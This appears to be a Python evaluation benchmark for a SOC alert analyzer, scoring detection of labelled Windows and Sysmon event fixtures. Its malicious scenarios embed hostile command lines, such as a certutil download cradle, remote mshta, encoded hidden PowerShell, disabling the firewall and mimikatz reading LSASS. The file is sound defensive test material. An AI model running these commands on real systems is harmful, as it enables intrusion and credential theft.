"""
SOC Alert Analyzer — Realistic Endpoint Attack Evaluation Benchmark
Evaluates detection fidelity against realistic endpoint attack kill-chains
and benign operational workflows using Sysmon and Windows Event telemetry.
"""

import json
from dataclasses import dataclass, asdict
from typing import List, Dict, Any, Optional
from pathlib import Path

from app.parsers.windows_event import WindowsEventParser
from app.security.normalizer import AlertNormalizer
from app.security.mitre_mapper import MitreMapper

BENCHMARK_VERSION = "1.0.0"


@dataclass
class EndpointAttackScenario:
    scenario_id: str
    attack_phase: str
    is_malicious: bool
    event_id: int
    source_type: str
    raw_event: Dict[str, Any]
    expected_technique: Optional[str] = None
    expected_tactic: Optional[str] = None
    description: str = ""


# Curated realistic endpoint attack and benign scenarios using Sysmon & Windows Security Events
ENDPOINT_SCENARIOS: List[EndpointAttackScenario] = [
    # 1. Initial Access / Execution LOLBIN (Sysmon 1: Ingress Tool Transfer)
    EndpointAttackScenario(
        scenario_id="attack_01_certutil_cradle",
        attack_phase="Initial Access / Command & Control",
        is_malicious=True,
        event_id=1,
        source_type="Sysmon",
        expected_technique="T1105",
        expected_tactic="Command and Control",
        description="Word document spawning certutil LOLBIN to download staging implant.",
        raw_event={
            "Id": 1,
            "Provider_Name": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-10-25T01:00:00Z",
            "EventData": {
                "Image": "C:\\Windows\\System32\\certutil.exe",
                "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.22/stage2.exe C:\\Users\\Public\\stage2.exe",
                "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "User": "VICTIM_DOMAIN\\jdoe"
            }
        }
    ),
    # 2. Defense Evasion LOLBIN (Sysmon 1: System Binary Proxy Execution)
    EndpointAttackScenario(
        scenario_id="attack_02_mshta_proxy",
        attack_phase="Defense Evasion",
        is_malicious=True,
        event_id=1,
        source_type="Sysmon",
        expected_technique="T1218",
        expected_tactic="Defense Evasion",
        description="Mshta proxy executing remote HTML application payload.",
        raw_event={
            "Id": 1,
            "Provider_Name": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-10-25T01:01:00Z",
            "EventData": {
                "Image": "C:\\Windows\\System32\\mshta.exe",
                "CommandLine": "mshta.exe http://198.51.100.22/beacon.hta",
                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                "User": "VICTIM_DOMAIN\\jdoe"
            }
        }
    ),
    # 3. Execution (Windows 4688: Encoded PowerShell)
    EndpointAttackScenario(
        scenario_id="attack_03_encoded_powershell",
        attack_phase="Execution",
        is_malicious=True,
        event_id=4688,
        source_type="Windows_Event",
        expected_technique="T1059.001",
        expected_tactic="Execution",
        description="Obfuscated Base64 Encoded PowerShell cradle executing in memory.",
        raw_event={
            "Id": 4688,
            "TimeCreated": "2026-10-25T01:02:00Z",
            "EventData": {
                "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0...",
                "TargetUserName": "jdoe"
            }
        }
    ),
    # 4. Defense Evasion (Windows 1102: Audit Log Cleared)
    EndpointAttackScenario(
        scenario_id="attack_04_audit_log_cleared",
        attack_phase="Defense Evasion",
        is_malicious=True,
        event_id=1102,
        source_type="Windows_Event",
        expected_technique="T1070.001",
        expected_tactic="Defense Evasion",
        description="Adversary clearing Windows Security Audit Log via wevtutil.",
        raw_event={
            "Id": 1102,
            "TimeCreated": "2026-10-25T01:03:00Z",
            "Message": "The audit log was cleared by user Administrator",
            "EventData": {
                "TargetUserName": "Administrator"
            }
        }
    ),
    # 5. Defense Evasion: Impair Defenses (Windows 4688: Disable Firewall)
    EndpointAttackScenario(
        scenario_id="attack_05_firewall_disabled",
        attack_phase="Defense Evasion",
        is_malicious=True,
        event_id=4688,
        source_type="Windows_Event",
        expected_technique="T1562.001",
        expected_tactic="Defense Evasion",
        description="Adversary disabling Windows Firewall via netsh command.",
        raw_event={
            "Id": 4688,
            "TimeCreated": "2026-10-25T01:04:00Z",
            "EventData": {
                "NewProcessName": "C:\\Windows\\System32\\netsh.exe",
                "CommandLine": "netsh advfirewall set allprofiles state off",
                "TargetUserName": "Administrator"
            }
        }
    ),
    # 6. Credential Access (Sysmon 10: LSASS Memory Access / Mimikatz)
    EndpointAttackScenario(
        scenario_id="attack_06_mimikatz_lsass_dump",
        attack_phase="Credential Access",
        is_malicious=True,
        event_id=10,
        source_type="Sysmon",
        expected_technique="T1003.001",
        expected_tactic="Credential Access",
        description="Mimikatz accessing LSASS process memory with read permissions.",
        raw_event={
            "Id": 10,
            "Provider_Name": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-10-25T01:05:00Z",
            "EventData": {
                "SourceImage": "C:\\Users\\Public\\mimikatz.exe",
                "TargetImage": "C:\\Windows\\System32\\lsass.exe",
                "GrantedAccess": "0x1010",
                "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d484"
            }
        }
    ),
    # 7. Persistence (Sysmon 13: Registry Run Key Added)
    EndpointAttackScenario(
        scenario_id="attack_07_registry_run_key",
        attack_phase="Persistence",
        is_malicious=True,
        event_id=13,
        source_type="Sysmon",
        expected_technique="T1547.001",
        expected_tactic="Persistence",
        description="Backdoor added to Windows CurrentVersion\\Run autostart registry key.",
        raw_event={
            "Id": 13,
            "Provider_Name": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-10-25T01:06:00Z",
            "EventData": {
                "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityService",
                "Details": "C:\\Users\\Public\\backdoor.exe",
                "Image": "C:\\Users\\Public\\backdoor.exe"
            }
        }
    ),
    # 8. Persistence (Windows 7045: New Windows Service Installed)
    EndpointAttackScenario(
        scenario_id="attack_08_windows_service_installed",
        attack_phase="Persistence",
        is_malicious=True,
        event_id=7045,
        source_type="Windows_Event",
        expected_technique="T1543.003",
        expected_tactic="Persistence",
        description="Persistence established by registering a new Windows Service.",
        raw_event={
            "Id": 7045,
            "TimeCreated": "2026-10-25T01:07:00Z",
            "EventData": {
                "ServiceName": "MaliciousAgent",
                "ImagePath": "C:\\Windows\\Temp\\svc_agent.exe",
                "ServiceType": "user mode service"
            }
        }
    ),
    # 9. Privilege Escalation (Windows 4732: Added to Local Administrators)
    EndpointAttackScenario(
        scenario_id="attack_09_admin_group_escalation",
        attack_phase="Privilege Escalation",
        is_malicious=True,
        event_id=4732,
        source_type="Windows_Event",
        expected_technique="T1098",
        expected_tactic="Privilege Escalation",
        description="Attacker adding newly compromised user to local Administrators security group.",
        raw_event={
            "Id": 4732,
            "TimeCreated": "2026-10-25T01:08:00Z",
            "EventData": {
                "TargetUserName": "Local Administrators Group",
                "MemberName": "attacker_user",
                "SubjectUserName": "Administrator"
            }
        }
    ),
    # 10. Lateral Movement (Windows 5140: Admin Share SMB Access)
    EndpointAttackScenario(
        scenario_id="attack_10_smb_admin_share",
        attack_phase="Lateral Movement",
        is_malicious=True,
        event_id=5140,
        source_type="Windows_Event",
        expected_technique="T1021.002",
        expected_tactic="Lateral Movement",
        description="Lateral movement probe accessing administrative share IPC$ on internal target.",
        raw_event={
            "Id": 5140,
            "TimeCreated": "2026-10-25T01:09:00Z",
            "EventData": {
                "ShareName": "\\\\*\\IPC$",
                "IpAddress": "192.168.1.105",
                "SubjectUserName": "Administrator"
            }
        }
    ),
    # 11. Command and Control (Sysmon 22: DNS C2 Query)
    EndpointAttackScenario(
        scenario_id="attack_11_dns_c2_query",
        attack_phase="Command and Control",
        is_malicious=True,
        event_id=22,
        source_type="Sysmon",
        expected_technique="T1071.004",
        expected_tactic="Command and Control",
        description="DNS query to dynamic DNS provider for C2 beaconing.",
        raw_event={
            "Id": 22,
            "Provider_Name": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-10-25T01:10:00Z",
            "EventData": {
                "QueryName": "beacon-c2-stage.dynu.net",
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            }
        }
    ),
    # 12. Credential Access (Windows 4625: NTLM Brute Force / Spraying)
    EndpointAttackScenario(
        scenario_id="attack_12_logon_brute_force",
        attack_phase="Credential Access",
        is_malicious=True,
        event_id=4625,
        source_type="Windows_Event",
        expected_technique="T1110",
        expected_tactic="Credential Access",
        description="Repeated failed logon attempts indicating automated credential brute force.",
        raw_event={
            "Id": 4625,
            "TimeCreated": "2026-10-25T01:11:00Z",
            "EventData": {
                "TargetUserName": "Administrator",
                "IpAddress": "203.0.113.88",
                "Status": "0xC000006D",
                "SubStatus": "0xC000006A"
            }
        }
    ),

    # --------------------------------------------------------------------------
    # Difficult Benign Telemetry Scenarios (Zero False Positive Verification)
    # --------------------------------------------------------------------------
    # 13. Benign System Maintenance (TrustedInstaller Windows Update)
    EndpointAttackScenario(
        scenario_id="benign_01_trustedinstaller",
        attack_phase="Benign Maintenance",
        is_malicious=False,
        event_id=4688,
        source_type="Windows_Event",
        description="Legitimate Windows Update service executing TiWorker.",
        raw_event={
            "Id": 4688,
            "TimeCreated": "2026-10-25T01:12:00Z",
            "EventData": {
                "NewProcessName": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-servicingstack_...\\TiWorker.exe",
                "CommandLine": "TiWorker.exe -Embedding",
                "ParentProcessName": "C:\\Windows\\System32\\TrustedInstaller.exe",
                "TargetUserName": "SYSTEM"
            }
        }
    ),
    # 14. Benign MSI Software Installation
    EndpointAttackScenario(
        scenario_id="benign_02_msiexec_install",
        attack_phase="Benign Software Setup",
        is_malicious=False,
        event_id=4688,
        source_type="Windows_Event",
        description="Routine silent installation of enterprise business application.",
        raw_event={
            "Id": 4688,
            "TimeCreated": "2026-10-25T01:13:00Z",
            "EventData": {
                "NewProcessName": "C:\\Windows\\System32\\msiexec.exe",
                "CommandLine": "msiexec.exe /i C:\\Installers\\EnterpriseApp.msi /qn",
                "ParentProcessName": "C:\\Windows\\explorer.exe",
                "TargetUserName": "jdoe"
            }
        }
    ),
    # 15. Benign Developer Workflow (Git & Pytest)
    EndpointAttackScenario(
        scenario_id="benign_03_dev_workflow",
        attack_phase="Benign Developer Operation",
        is_malicious=False,
        event_id=4688,
        source_type="Windows_Event",
        description="Developer executing pytest inside virtual environment.",
        raw_event={
            "Id": 4688,
            "TimeCreated": "2026-10-25T01:14:00Z",
            "EventData": {
                "NewProcessName": "C:\\Python312\\python.exe",
                "CommandLine": "python.exe -m pytest tests/ -v",
                "ParentProcessName": "C:\\Users\\jdoe\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
                "TargetUserName": "jdoe"
            }
        }
    ),
    # 16. Benign IT Admin Backup (Robocopy)
    EndpointAttackScenario(
        scenario_id="benign_04_robocopy_backup",
        attack_phase="Benign System Administration",
        is_malicious=False,
        event_id=4688,
        source_type="Windows_Event",
        description="Scheduled backup script copying user profiles to backup server.",
        raw_event={
            "Id": 4688,
            "TimeCreated": "2026-10-25T01:15:00Z",
            "EventData": {
                "NewProcessName": "C:\\Windows\\System32\\robocopy.exe",
                "CommandLine": "robocopy.exe C:\\Users\\Public D:\\Backups /E /ZB /R:1 /W:1",
                "ParentProcessName": "C:\\Windows\\System32\\taskeng.exe",
                "TargetUserName": "SYSTEM"
            }
        }
    ),
    # 17. Benign Single Mistyped Logon (One-off Auth Failure)
    EndpointAttackScenario(
        scenario_id="benign_05_single_mistyped_logon",
        attack_phase="Benign User Activity",
        is_malicious=False,
        event_id=4624,
        source_type="Windows_Event",
        description="Normal interactive console logon following workstation unlock.",
        raw_event={
            "Id": 4624,
            "TimeCreated": "2026-10-25T01:16:00Z",
            "EventData": {
                "TargetUserName": "jdoe",
                "LogonType": "2",
                "WorkstationName": "WORKSTATION-01"
            }
        }
    ),
    # 18. Benign Internal DNS Query
    EndpointAttackScenario(
        scenario_id="benign_06_internal_dns",
        attack_phase="Benign Network Activity",
        is_malicious=False,
        event_id=22,
        source_type="Sysmon",
        description="Workstation querying internal Active Directory Domain Controller.",
        raw_event={
            "Id": 22,
            "Provider_Name": "Microsoft-Windows-Sysmon",
            "TimeCreated": "2026-10-25T01:17:00Z",
            "EventData": {
                "QueryName": "dc01.corp.internal",
                "Image": "C:\\Windows\\System32\\svchost.exe"
            }
        }
    )
]


class EndpointAttackEvaluator:
    """Evaluates realistic Sysmon and Windows Event logs against detection heuristics."""

    def __init__(self):
        self.parser = WindowsEventParser()

    def evaluate_scenario(self, scenario: EndpointAttackScenario) -> Dict[str, Any]:
        """Parses and normalizes a scenario event, evaluating detection and MITRE mapping."""
        # 1. Parse raw event JSON
        content = json.dumps([scenario.raw_event])
        parsed_events = self.parser.parse(content)
        if not parsed_events:
            return {
                "scenario_id": scenario.scenario_id,
                "detected": False,
                "is_malicious": scenario.is_malicious,
                "error": "Failed to parse scenario content"
            }

        parsed_event = parsed_events[0]

        # 2. Normalize event into canonical Alert structure
        normalized = AlertNormalizer.normalize(parsed_event)

        # 3. Classify threat independently of ground truth labels
        # Strictly uses parsed telemetry, risk scores, and production detection outputs.
        # NEVER uses scenario.is_malicious, expected_technique, or expected_result.
        risk_score = normalized.get("risk_score", 0)
        mitre_tech = normalized.get("mitre_technique")
        is_threat = bool((risk_score >= 40) or (mitre_tech is not None))

        # 4. Independent MITRE technique evaluation against ground truth
        technique_match = True
        if scenario.expected_technique:
            technique_match = (mitre_tech == scenario.expected_technique)
        elif not scenario.is_malicious:
            technique_match = (mitre_tech is None)

        return {
            "scenario_id": scenario.scenario_id,
            "attack_phase": scenario.attack_phase,
            "is_malicious": scenario.is_malicious,
            "detected": is_threat,
            "risk_score": risk_score,
            "detected_technique": mitre_tech,
            "expected_technique": scenario.expected_technique,
            "technique_match": technique_match,
            "event_type": normalized.get("event_type"),
            "description": normalized.get("description"),
            "correct": (is_threat == scenario.is_malicious) and technique_match
        }

    def run_benchmark(self, scenarios: Optional[List[EndpointAttackScenario]] = None) -> Dict[str, Any]:
        """Runs the full endpoint attack evaluation benchmark across all scenarios."""
        target_scenarios = scenarios if scenarios is not None else ENDPOINT_SCENARIOS

        results = []
        tp = 0
        fp = 0
        tn = 0
        fn = 0
        technique_matches = 0
        technique_eval_count = 0
        technique_mismatches = []

        for sc in target_scenarios:
            res = self.evaluate_scenario(sc)
            results.append(res)

            actual_pos = sc.is_malicious
            pred_pos = res["detected"]

            if actual_pos and pred_pos:
                tp += 1
            elif not actual_pos and pred_pos:
                fp += 1
            elif not actual_pos and not pred_pos:
                tn += 1
            elif actual_pos and not pred_pos:
                fn += 1

            if sc.expected_technique:
                technique_eval_count += 1
                if res["technique_match"]:
                    technique_matches += 1
                else:
                    technique_mismatches.append({
                        "scenario_id": sc.scenario_id,
                        "expected_technique": sc.expected_technique,
                        "detected_technique": res["detected_technique"]
                    })

        total = len(target_scenarios)
        precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
        specificity = tn / (tn + fp) if (tn + fp) > 0 else 0.0
        f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
        fpr = fp / (fp + tn) if (fp + tn) > 0 else 0.0
        accuracy = (tp + tn) / total if total > 0 else 0.0
        tech_accuracy = technique_matches / technique_eval_count if technique_eval_count > 0 else 1.0

        return {
            "benchmark_version": BENCHMARK_VERSION,
            "total_scenarios": total,
            "metrics": {
                "true_positives": tp,
                "false_positives": fp,
                "true_negatives": tn,
                "false_negatives": fn,
                "precision": precision,
                "recall": recall,
                "specificity": specificity,
                "f1_score": f1,
                "false_positive_rate": fpr,
                "accuracy": accuracy,
                "mitre_technique_match_accuracy": tech_accuracy,
                "mitre_technique_eval_count": technique_eval_count,
                "mitre_technique_matches": technique_matches,
                "mitre_technique_mismatches": technique_mismatches
            },
            "detailed_results": results
        }
